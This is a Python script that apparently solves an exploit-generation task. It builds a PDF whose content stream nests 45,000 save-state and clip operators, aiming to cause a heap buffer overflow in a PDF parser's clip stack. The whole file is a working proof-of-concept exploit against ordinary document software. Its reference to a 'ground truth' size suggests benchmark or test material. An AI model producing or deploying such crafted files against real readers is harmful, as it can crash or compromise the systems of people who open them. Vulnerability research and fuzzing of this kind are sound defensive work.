import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Buffer Overflow caused by unchecked nesting depth 
        # when pushing a clip mark, likely in the layer/clip stack.
        # We generate a PDF with a content stream containing deeply nested 
        # Save State (q) and Clip (W) operators.
        
        # Repetition unit: "q 0 0 10 10 re W n\n"
        # - q: Save graphics state (pushes to gstate stack)
        # - 0 0 10 10 re: Define a rectangle path
        # - W: Set clipping path to intersection of current and new (pushes to clip stack in some implementations)
        # - n: End path (no paint)
        # 19 bytes per chunk. 
        # Ground truth is ~825KB. 45000 * 19 = 855,000 bytes.
        
        chunk = b"q 0 0 10 10 re W n\n"
        repetitions = 45000
        
        payload = chunk * repetitions
        
        # PDF Header
        header = b"%PDF-1.7\n"
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # Defines the page and references content stream in Obj 4
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj\n"
        
        # Object 4: Content Stream
        stream_len = len(payload)
        obj4_start = b"4 0 obj\n<< /Length " + str(stream_len).encode() + b" >>\nstream\n"
        obj4_end = b"\nendstream\nendobj\n"
        
        # Construct the PDF and calculate offsets for the XRef table
        out = bytearray()
        out.extend(header)
        
        offsets = {}
        
        # Add objects and record offsets
        offsets[1] = len(out)
        out.extend(obj1)
        
        offsets[2] = len(out)
        out.extend(obj2)
        
        offsets[3] = len(out)
        out.extend(obj3)
        
        offsets[4] = len(out)
        out.extend(obj4_start)
        out.extend(payload)
        out.extend(obj4_end)
        
        # XRef Table
        xref_start = len(out)
        out.extend(b"xref\n")
        out.extend(b"0 5\n")
        # Entry 0: Special entry
        out.extend(b"0000000000 65535 f \n")
        # Entries 1-4
        for i in range(1, 5):
            out.extend(f"{offsets[i]:010} 00000 n \n".encode())
            
        # Trailer
        out.extend(b"trailer\n")
        out.extend(b"<< /Size 5 /Root 1 0 R >>\n")
        out.extend(b"startxref\n")
        out.extend(f"{xref_start}\n".encode())
        out.extend(b"%%EOF\n")
        
        return bytes(out)